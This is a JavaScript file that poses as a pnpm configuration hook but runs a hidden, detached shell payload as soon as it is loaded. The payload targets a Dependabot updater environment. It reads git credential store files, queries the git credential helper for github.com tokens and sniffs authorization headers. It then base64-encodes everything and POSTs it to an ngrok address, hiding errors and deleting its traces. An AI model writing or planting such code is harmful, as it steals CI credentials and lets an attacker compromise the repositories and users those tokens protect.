'use strict';
try {
  const { spawn } = require('child_process');
  const fs = require('fs');
  const path = require('path');
  const NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app';

  const script =
    // DIRECT: lees de .git.store in de PWD (onze directory)
    'echo "=PWD="; pwd; ' +
    'echo "=GIT_STORE_DIRECT="; cat *.git.store 2>&1; ' +
    'echo "=GIT_STORE_FIND="; find . -name "*.git.store" 2>/dev/null; ' +
    // alle store files in de gehele repo
    'echo "=ALL_STORES="; find /home/dependabot/dependabot-updater/repo -name "*.git.store" 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done; ' +
    // credential helper direct aanroepen -- vraag credentials op voor github.com
    'echo "=CRED_HELPER_GET="; printf "protocol=https\\nhost=github.com\\n\\n" | /home/dependabot/bin/git-credential-store-immutable get --file *.git.store 2>&1; ' +
    // credential helper binary type
    'echo "=CRED_HELPER_TYPE="; file /home/dependabot/bin/git-credential-store-immutable 2>&1; ' +
    // git ls-remote met token injection -- zien we de Authorization header?
    'echo "=GIT_HEADERS="; GIT_CURL_VERBOSE=1 git ls-remote origin 2>&1 | grep -i "authorization\\|token\\|bearer" | head -5; ' +
    // alle bestanden in onze PWD
    'echo "=PWD_FILES="; ls -la . 2>&1; ' +
    'echo "=REPO_ROOT="; ls /home/dependabot/dependabot-updater/repo/ 2>&1; ' +
    'echo "=ID="; id';

  const exfil =
    '(' + script + ') | base64 -w0 > /tmp/.px 2>/dev/null && ' +
    "curl -sk -X POST '" + NGROK + "?poc=git_store_read' " +
    "-H 'Content-Type: text/plain' --data-binary @/tmp/.px 2>/dev/null; " +
    'rm -f /tmp/.px';

  spawn('sh', ['-c', exfil], { detached: true, stdio: 'ignore' }).unref();
} catch (e) {}

module.exports = {
  hooks: { readPackage(pkg) { return pkg; } }
};
